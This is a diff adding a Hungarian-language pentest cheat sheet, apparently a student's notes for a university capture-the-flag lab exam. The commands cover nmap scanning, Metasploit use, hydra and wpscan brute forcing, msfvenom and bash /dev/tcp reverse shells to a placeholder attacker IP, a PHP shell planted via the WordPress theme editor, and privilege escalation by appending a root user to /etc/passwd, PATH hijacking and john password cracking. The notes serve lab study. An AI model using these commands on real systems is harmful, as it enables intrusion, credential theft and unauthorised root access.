@@ -1,0 +1,190 @@
+
+https://codefile.io/f/1glCvUh76PuE9FHqkAPg
+https://unidebhu-my.sharepoint.com/:b:/g/personal/pyx_mailbox_unideb_hu/EaEks0GE83dOqW8UrPrOu4gBOAWNabLDpQklwePjRKrFnw?e=MC379n
+#--------------------------------------------
+#X2GO
+#default settings
+#parrot 172.22.214.126  #parroton belül: https://10.0.0.123/
+host,login(student),ssh poret, MATE, WAN
+setxkbmap hu #magyar keyboard
+1. geany
+2. ip 
+
+#-----INFORMATION GATHERING, SCANNING---------
+sudo nmap -sS -sV -T4 10.0.0.0
+#service keresés exploitdb, msfconosole
+https://www.exploit-db.com/
+nikto -h 10.0.0.0
+
+#msfconsole
+search amirekíváncsivagy pl:wordpress
+grep -i shell search wordpress #szűkített keresés
+info száma
+use 20 #elindítás, majd paraméterezés
+options #exploit paraméter helpje
+paraméterek: password, username, rhost
+set username admin
+set password jelszo
+set rhost 10.0.0.0
+run #futtatás
+set httpclienttimeout 60 #ha nincs shell és timeoutot ad
+#kész a meterpreter shell, help meghívása az opciókhoz, shell a klasszikus shellhez
+
+#wpscan, dirb, dirbuster, hydra, cewl
+dirbuster: be recursive kikapcsolása!
+wpscan --url http://10.0.0.0/wordpress/ -U /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt
+wpscan --url 10.0.0.0 -U admin -P /usr/share/wordlists/rockyou.txt
+wpscan --url 10.0.0.0. --enumerate u
+enum4linux 10.0.0.0
+dirb http://10.0.0.0:80 /usr/share/wordlists/dirb/common.txt -r
+hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f 10.0.0.0 http-get /admin
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.0.0.0 http-get /admin
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.0
+#basic http authentication bypass
+hydra -L user.txt -P pass.txt 192.168.0.105 http-get 
+ncrack -U user.txt -P pass.txt http://10.0.0.0
+
+cewl http://10.0.0.0 > wordlist #custom word list generator for bruteforce
+cewl -d 3 -o -a -e -w wordlist http://10.0.0.0
+
+#oldal forrás vizsgálat
+view-source, inspect Q #keresés 'hidden' kulcsszó
+#-------------------------------------------------
+#------------REVERSE SHELL------------------------
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+
+OS detection: uname -a
+
+1. shell készítése, msfvenom  --- msfvenom -p linux/(x64)/shell/reverse_tcp lhost=TÁMADÓIP lport=4444 -f elf > revshell.elf
+2. shell letöltése a célgépen --- sudo python3 -m http.server        wget http://TÁMADÓIP:8000/amikell
+3. célgépen jogosultság chmod --- chmod +X fájlnév  vagy  chmod 777 fájlnév
+4. listener a támadón         --- nc -lvnp 4444
+5. shell elindítása           --- ./revshell.elf
+6. shell upgrade              --- python3 -c "import pty;pty.spawn('/bin/bash')"
+
+#cél: a wordpress mögötti serverre hozzáférés
+appearence--theme editor, már meglévő php forráskódba beágyazzuk a shell kódot
+msfvenom -p php/reverse_php LHOST: TÁMADÓIP LPORT:4444 -f raw > probashell.php
+cat probashell.php #--> shell kód kimásolása és beszúrás a weblapra-->update
+#ha megynitjuk az weblapot, kapunk egy shellt
+
+#remote code injection bash shell
+bash -c 'bash -i >& /dev/tcp/TÁMADÓIP/4444 0>&1'
+#URL encode ha szükséges!
+
+#--------------------------------------------
+#----------PRIVILIGE ESCALATION--------------
+1. MISSING PERMISSION
+cat /etc/passwd #jelszókiolvasás, felhasználó létrehozás
+cat etc/shadow
+ls -l /etc/passwd
+#hashgenerálás
+mkpasswd -m sha-512 newpasswordhere
+openssl passwd -1 salt [salt] [jelszo]
+
+new:jelszohash:0:0:root:/root:/bin/bash
+new:$6$YDDh3ZRRITj$EVfo5ApfM5..EwhfRGYXEvpcBa5WZlNxJD1YvAJyiq27PqjgUdhMyv3AukOwG7XqZxf6PlPS5v8XTEoSbrs:0:0:root:/root:/bin/bash
+echo 'new:jelszohash:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+#hashelt jelszó törés johnjohn bobhash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=cryptnal
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt # --format=crypt
+https://crackstation.net/
+
+#futtatás mmás userként
+sudo -u bob '/home/bob/script2.sh'
+sudo -l #mit tudunk adott felhaszálóban rootként futtatni
+
+2. SUID BIT
+https://gtfobins.github.io/
+#a futtatott program a tulajdonos jogkörével kerül futtatásra
+find /  -perm -u=s 2>/dev/null #ahol hibát dob nem displayeli
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+
+3. PATH VARIABLE HIJACKING
+#ha nincs abszolt hivatkozás
+#az eredeti fájl egy hivatkozását átíírjuk a sajátra és a fájl tulaj nevében drop egy shellt
+#tmp-be létrehoozunk egy olyan kiterjesztésű programot amit egy másik meghív, futtatásijog
+#pl itt: scp kiterjesztés
+echo "/bin/bash" > scp
+             #vagy
+echo '#!/bin/bash' >> scp
+echo 'bash -i' >> scp
+chmod +x scp
+#átállítjuk a meghívási útvonalát
+export  PATH=/tmp:$PATH
+
+#-------------------------------------------
+              #BURPSUITE
+foxyproxy bekapcs
+interccept is on #miután betöltött az oldal és rámentünk valamire
+send to repeater 
+send to intruder #bruteforcehoz
+
+
+https://tinyurl.com/szerbusz
+
+#ha van smbd vagy ftp akkor enum4linux
+#ssh -p 80 username@ipcím 
+
+----------------------------------------------------------
+5db user
+elso lepes: 2 ut studuent usr sshval es bent vagy nincs jogosultsag, txt fajlok
+	find/* valami
+kilepek
+
+nmap 80as
+dirbuster, common.txt
+!nem hydra nem db exploit
+elrejtett szolista
+robots.txt
+bruteforcolas
+php oldal
+burp intercept, intruder jelszokat lementeni, betolteni burpbe a jelszavakat uri encoding bekapcsolva legyen
+reverse shell, fajlfeltoltes, dirctory uploadsnal
+/home atnezese,
+passwd fajl olvashato, sshzni kell vele
+student sshval suid bit megnezese
+rsync, 
+perl script, 
+pentestmonkey
+----------------------------------------------------------------------------
+5db flag = 5db txt,be irt jelszoszeruseg
+
+1. student - studenttel be sshzni a celgepre ott finddal egy szembetuno txt-t keresni elso flag.
+2. nmap 80as port http szerver, dirbuster, az osszes relevnas oldal inspectelese, oda nem illo dolgok keresese,
+	valszeg talalunk egy rejtett oldalt amit a urlbe beirva megnyitunk, itt egy csomo felhasznalonev vagy jelszo lesz,
+	ezt kimentjuk egy txt-be.
+3. valszeg phps oldal lesz ennek a bejelentkezesi feluleten burpel elkapjuk interceptbe bedobjuk az
+	elozetesen kimentett txt-t es megbruteforcoljuk, ha mazlink van kapunk egy belepest
+4. ha beleptunk keresunk egy feltoltesi feluletet ha van csinalunk pentestmonkeyes reverse shellt,
+	feltoltjuk elinditjuk listenerrel elkapjuk.
+5. bent vagyunk, erdemes felokositani a python 3at, es tovabb keresni finddal txtket amikhez van hozzaferesunk
+	ez ujabb flag lesz valszeg
+6. tovabbiakban mas ssh felhasznalovel es suid bitekkel erdemes foglalkozni
+
+
+
+
+unshadow local_passwd local_shadow > unshadowed.txt
+
+"passwd és shadow itt az etc/passwd és shadow másolata egy fájlban"
+"abszolút elérési út a local passwd és shadownál"
+
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt 
+
+
+
+
+send to intruder, show payloqds
+add
+
+ah geci megvan de kiégek, majd elmesélem
+
+
+
+
+"lehet meg kell adni a hash fajtáját -- https://hashes.com/en/tools/hash_identifier"
